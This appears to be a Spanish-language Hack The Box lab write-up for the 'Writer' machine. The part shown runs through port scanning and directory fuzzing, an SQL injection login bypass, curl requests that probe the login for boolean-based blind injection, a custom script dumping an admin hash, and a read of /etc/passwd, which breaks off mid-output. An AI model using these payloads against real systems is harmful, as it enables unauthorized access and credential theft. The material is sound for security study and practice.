<!doctype html><html lang=es><head><title>Writer | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta name=author content="7Rocky"><meta property="og:title" content="Writer"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/writer/"><meta property="article:section" content="htb"><meta property="article:published_time" content="2021-12-11T00:00:00+01:00"><meta property="article:modified_time" content="2022-04-05T03:20:31+02:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="Writer"><meta itemprop=description content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta itemprop=datePublished content="2021-12-11T00:00:00+01:00"><meta itemprop=dateModified content="2022-04-05T03:20:31+02:00"><meta itemprop=wordCount content="3702"><meta itemprop=keywords content="smb,flask,smtp,cronjob,file-permissions,command-injection,sqli,static-code-analysis,password-reuse,rce,hash-cracking,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Writer"><meta name=twitter:description content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/writer/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/writer/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/writer/&text=Writer" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/writer/&title=Writer" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Writer</h1><time class="f6 mv4 dib tracked" datetime=2021-12-11T00:00:00+01:00>11 / 12 / 2021</time></header><div class=htb-image><img alt=Writer src=/images/HTB/Writer/Writer.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/smb title=SMB>SMB</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/flask title=Flask>Flask</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/smtp title=SMTP>SMTP</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cronjob title="Tareas Cron">Tareas Cron</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/file-permissions title="Permisos de archivos">Permisos de archivos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sqli title="Inyección de código SQL">Inyección de código SQL</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/static-code-analysis title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/hash-cracking title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</a></li><li><a href=#leyendo-archivos-mediante-sqli>Leyendo archivos mediante SQLi</a></li><li><a href=#análisis-del-código-python>Análisis del código Python</a></li><li><a href=#enumeración-por-smb>Enumeración por SMB</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#movimiento-lateral-al-usuario-john>Movimiento lateral al usuario <code>john</code></a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.101</li><li><strong>Fecha</strong>: 31 / 07 / 2021</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.101 -p 22,80,139,445
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.101
</span></span><span style=display:flex><span>Host is up (0.050s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE     VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
</span></span><span style=display:flex><span>|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
</span></span><span style=display:flex><span>|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
</span></span><span style=display:flex><span>80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Story Bank | Writer.HTB
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span style=display:flex><span>445/tcp open  netbios-ssn Samba smbd 4.6.2
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: 13m06s
</span></span><span style=display:flex><span>|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span></span><span style=display:flex><span>| smb2-security-mode:
</span></span><span style=display:flex><span>|   2.02:
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time:
</span></span><span style=display:flex><span>|   date:
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 14.60 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 139 y 445 (SMB).</p><h2 id=enumeración-web>Enumeración web</h2><p>Si vamos a <code>http://10.10.11.101</code> veremos un <em>blog</em> como este:</p><p><img src=/images/HTB/Writer/Writer-blog.png alt="Writer blog"></p><p>El <em>blog</em> contiene algunos artículos, pero nada interesante. Podemos utilizar <code>gobuster</code> para aplicar <em>fuzzing</em> de rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://10.10.11.101
</span></span><span style=display:flex><span>/contact              (Status: 200) [Size: 4905]
</span></span><span style=display:flex><span>/about                (Status: 200) [Size: 3522]
</span></span><span style=display:flex><span>/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]
</span></span><span style=display:flex><span>/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
</span></span><span style=display:flex><span>/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
</span></span><span style=display:flex><span>/administrative       (Status: 200) [Size: 1443]
</span></span><span style=display:flex><span>/server-status        (Status: 403) [Size: 277]
</span></span></code></pre></div><p>Como vemos, hay una ruta llamada <code>/administrative</code>:</p><p><img src=/images/HTB/Writer/Writer-administrative.png alt="Writer administrative"></p><p>Podemos probar algunas credenciales por defecto (<code>admin:admin</code>, <code>root:password</code>, etc.), pero ninguna funciona.</p><h2 id=encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</h2><p>El formulario de inicio de sesión de <code>/administrative</code> es vulnerable a inyección de código SQL (SQLi). Utilizando una inyección sencilla (o sea: <code>' or 1=1-- -</code>) podemos saltar la autenticación y acceder al panel de administración:</p><p><img src=/images/HTB/Writer/Writer-dashboard.png alt="Writer dashboard"></p><p>En este punto, podemos utilizar el SQLi para obtener el contenido de la base de datos. Nótese que se trata de un SQLi de tipo <em>Boolean-based blind</em> (si la respuesta del servidor muestra un error es porque la consulta SQL ha resultado en <code>false</code>; pero si la respuesta del servidor es exitosa, entonces la consulta SQL ha resultado en <code>true</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl 10.10.11.101/administrative -sd <span style=color:#e6db74>&#34;uname=&#39; or 1=2-- -&amp;password=x&#34;</span> | grep error
</span></span><span style=display:flex><span>        &lt;p class=&#34;error&#34; style=&#34;color:red&#34;&gt;&lt;strong style=&#34;color:red&#34;&gt;Error:&lt;/strong&gt; Incorrect credentials supplied &lt;/p&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ curl 10.10.11.101/administrative -sd <span style=color:#e6db74>&#34;uname=&#39; or 1=1-- -&amp;password=x&#34;</span> | grep error
</span></span></code></pre></div><p>Con esto, se puede obtener el contenido de un campo carácter a carácter, de manera que se itera sobre todos los caracteres ASCII imprimibles hasta dar con el correcto para una posición de un determinado campo. Por este motivo, para la extracción es conveniente utilizar un <em>script</em> automático o una herramienta como <code>sqlmap</code>.</p><p>Podemos obtener algunos campos de las tablas de la base de datos utilizando un <em>script</em> personalizado en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/sqli.py><code>sqli.py</code></a> que utiliza el algoritmo de Búsqueda Binaria para extraer los datos más rápidamente (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#sqlipy>aquí</a>).</p><p>Aquí podemos ver algunos de los contenidos en formato JSON (la tabla <code>stories</code> y las columnas <code>ganalitics</code> y <code>date_created</code> se han omitido porque contenían muchos datos inútiles):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;writer&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;site&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;id&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;1&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;title&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Story Bank&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;description&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;This is a site where I publish my own and others stories&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;logo&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;/img/logo.png&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;favicon&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;/img/favicon.ico&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;ganalytics&#34;</span>: []
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;stories&#34;</span>: {},
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;users&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;id&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;1&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;username&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;password&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;118e48794631a9612484ca8b55f622d0&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;email&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;admin@writer.htb&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;status&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Active&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;date_created&#34;</span>: []
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Aparece el <em>hash</em> de una contraseña, pero no es rompible mediante <code>john</code> o <code>hashcat</code>.</p><h2 id=leyendo-archivos-mediante-sqli>Leyendo archivos mediante SQLi</h2><p>Si verificamos los privilegios del usuario de la base de datos, vemos que podemos leer y escribir en archivos (privilegio llamado <code>FILE</code>) si el usuario a nivel de sistema tiene los permisos necesarios:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py privileges
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;grantee&#34;</span>: [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#39;admin&#39;@&#39;localhost&#39;&#34;</span>
</span></span><span style=display:flex><span>  ],
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;privilege_type&#34;</span>: [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;FILE&#34;</span>
</span></span><span style=display:flex><span>  ],
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;table_catalog&#34;</span>: [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;def&#34;</span>
</span></span><span style=display:flex><span>  ],
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;is_grantable&#34;</span>: [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;NO&#34;</span>
</span></span><span style=display:flex><span>  ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Como prueba de concepto, podemos leer el archivo <code>/etc/passwd</code>. Esto muestra que hay dos usuarios de bajos privilegios en la máquina: <code>kyle</code> y <code>john</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py /etc/passwd
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
